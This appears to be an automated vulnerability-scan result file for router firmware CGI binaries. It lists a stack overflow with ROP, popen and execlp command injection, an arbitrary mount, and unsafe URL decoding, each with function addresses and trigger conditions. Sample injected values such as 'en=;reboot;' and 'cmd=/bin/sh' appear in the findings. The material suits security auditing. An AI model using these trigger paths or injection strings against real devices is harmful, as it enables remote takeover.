{"name": "exploit_chain-stack_overflow_standalone", "file_path": "htdocs/fileaccess.cgi", "location": "fileaccess.cgi:0x9cfc", "risk_score": 9.5, "confidence": 9.0, "description": "Exploit Chain: Stack overflow vulnerability (fcn.0001c368) precisely overwrites return address via excessively long filename (>2048B), combined with file upload functionality to deploy ROP chain. Trigger condition: Single upload request carrying carefully crafted filename. Exploit probability: Critical (can bypass ASLR and directly obtain shell).", "code_snippet": "N/A", "link_identifiers": ["exploit_chain", "stack_overflow", "filename", "fcn.0001c368", "ROP"], "notes": "exploit_chain"}
{"name": "command_injection-popen-en_param", "file_path": "htdocs/cgibin", "location": "cgibin:0x1e478 (fcn.0001e424)", "risk_score": 9.5, "confidence": 9.0, "description": "Command injection vulnerability (popen): An attacker controls the 'en' parameter value in the QUERY_STRING via an HTTP request, which is processed by the parsing function (fcn.0001f974) and passed to fcn.0001e424. This function uses snprintf to directly concatenate the parameter into the command 'xmldbc -g /portal/entry:%s/name', which is then executed via popen. Trigger condition: Accessing the CGI endpoint handling action=mount/umount while controlling the 'en' parameter value (e.g., 'en=;reboot;'). Critical constraint missing: Absence of character filtering/command validation allows attackers to inject arbitrary commands for RCE.", "link_identifiers": ["QUERY_STRING", "en", "action", "fcn.0001e424", "snprintf", "popen", "xmldbc", "fcn.0001f974"], "notes": "Full attack chain: HTTP request â†’ Web server sets QUERY_STRING â†’ fcn.0001f974 parsing â†’ fcn.0001e424 executes command injection. Related to URL decoding process in input handling flaw (fcn.0001f5ac). Requires validation of actual trigger path through CGI endpoints like hedwig.cgi."}
{"name": "command_injection-execlp-param_3", "file_path": "htdocs/cgibin", "location": "cgibin:fcn.0001eaf0", "risk_score": 9.0, "confidence": 8.25, "description": "Command Injection Vulnerability (execlp): The QUERY_STRING parameter value is parsed by fcn.0001f974 and passed as param_3 to fcn.0001eaf0. When the parameter matches 0x52c|0x30000, param_3 is directly executed as an external command via execlp. Trigger condition: Access the target CGI endpoint and control specific query parameters (e.g., 'cmd=/bin/sh'). Critical risk: No input filtering exists, allowing attackers to inject arbitrary commands for RCE.", "link_identifiers": ["QUERY_STRING", "fcn.0001eaf0", "param_3", "execlp", "0x52c|0x30000", "fcn.0001f974"], "notes": "It is necessary to determine the command identifier corresponding to 0x52c|0x30000. The attack chain relies on the input parsing function of fcn.0001f974. It shares the QUERY_STRING contamination source with the popen vulnerability, forming a multi-vector RCE attack chain."}
{"name": "arbitrary_mount-content_length", "file_path": "htdocs/cgibin", "location": "cgibin:fcn.0001eaf0", "risk_score": 8.5, "confidence": 7.75, "description": "Arbitrary Mount Vulnerability: The CONTENT_LENGTH environment variable value is passed as param_4 to fcn.0001eaf0, which is then split by strtok and used in the mount system call. Trigger Condition: Sending a crafted HTTP request to activate the 'umnt' branch while controlling CONTENT_LENGTH to include malicious parameters (e.g., malicious filesystem paths). Actual Impact: Attackers can mount malicious filesystems leading to privilege escalation or denial of service.", "link_identifiers": ["CONTENT_LENGTH", "fcn.0001eaf0", "param_4", "strtok", "mount", "umnt"], "notes": "Service permissions require verification (REDACTED_PASSWORD_PLACEHOLDER may be needed). Shares execution environment fcn.0001eaf0 with execlp vulnerability, linked to input processing function fcn.0001f974. Cross-component risk: mount operation may compromise security isolation mechanisms."}
{"name": "input_processing-unsafe_url_decoding", "file_path": "htdocs/cgibin", "location": "cgibin:0x1f5ac (fcn.0001f5ac)", "risk_score": 9.0, "confidence": 9.0, "description": "Generic Input Processing Vulnerability: Retrieving input via getenv('QUERY_STRING') â†’ unsafe URL decoding (fcn.0001f5ac) â†’ insufficient buffer allocation (malloc) with no boundary checks. Attackers can exploit encodings like %00/%2f to trigger overflow or injection. This constitutes a fundamental flaw in QUERY_STRING-related vulnerabilities, affecting all components relying on this parsing logic.", "link_identifiers": ["QUERY_STRING", "getenv", "fcn.0001f5ac", "malloc", "URL[HIDDEN]", "[HIDDEN]"], "notes": "The initial contamination point forming the complete attack chain: HTTP request â†’ QUERY_STRING retrieval â†’ hazardous decoding â†’ propagation to functions like fcn.0001e424/fcn.0001eaf0. Directly linked to popen/execlp/mount vulnerabilities, establishing the foundation of the vulnerability chain."}
